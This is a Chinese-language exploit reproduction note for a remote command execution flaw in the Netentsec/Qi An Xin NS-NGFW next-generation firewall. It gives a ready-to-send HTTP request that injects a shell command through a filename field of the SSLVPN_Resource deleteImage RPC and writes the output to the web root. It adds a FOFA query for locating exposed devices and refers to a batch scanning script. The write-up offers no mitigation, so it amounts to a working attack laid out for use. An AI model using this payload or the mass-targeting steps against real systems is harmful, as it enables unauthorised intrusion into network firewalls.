# 0x00 软件介绍
网康NGFW：网康Next Generation FireWall，即网康下一代防火墙，网康NS-NGFW是网康下一代防火墙系列中的一款，由于网康目前被奇安信收购，故称为：奇安信 网康NS-NGFW  
官网：https://www.netentsec.com/product/lists_265.html

# 0x01 复现环境
复现环境：本地环境  
复现版本：None  
环境搭建：  
无

# 0x02 利用条件
无

# 0x03 影响版本
暂无

# 0x04 漏洞复现
burp中发送如下请求
```
POST /directdata/direct/router HTTP/1.1
Host: xxx.xxx.160.154:4430
User-Agent: Mozilla/5.0
Content-Length: 254
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Accept-Encoding: gzip

{
    "action": "SSLVPN_Resource", 
    "method": "deleteImage", 
    "data": [
        {
            "data": [
                "/var/www/html/d.txt;id > /var/www/html/1.txt"
            ]
        }
    ], 
    "type": "rpc", 
    "tid": 17
}
```
返回如下图  
![image](./pic/0.png)  
此时，再去访问根目录下的1.txt，如下图  
![image](./pic/1.png)

# 0x05 批量脚本
fofa搜索：app="网康科技-下一代防火墙"  
网康NS-NGFW-RCE-Batch-Detect.py，具体用法见：python3 网康NS-NGFW-RCE-Batch-Detect.py -h  
效果如下  
![image](./pic/2.png)

# 0x06 参考链接
https://mp.weixin.qq.com/s/QqlueerhP0uVWWJNULhGvw
